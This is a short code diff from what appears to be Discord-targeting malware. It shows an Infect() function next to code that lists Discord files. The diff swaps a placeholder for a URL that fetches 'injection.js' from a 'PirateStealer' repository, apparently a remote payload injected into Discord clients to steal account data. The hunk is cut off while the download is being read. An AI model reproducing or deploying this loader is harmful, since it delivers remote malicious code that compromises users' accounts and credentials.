@@ -27,7 +27,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('XXXXXX', (resp) => {
+    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/plugins/Rickroll/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
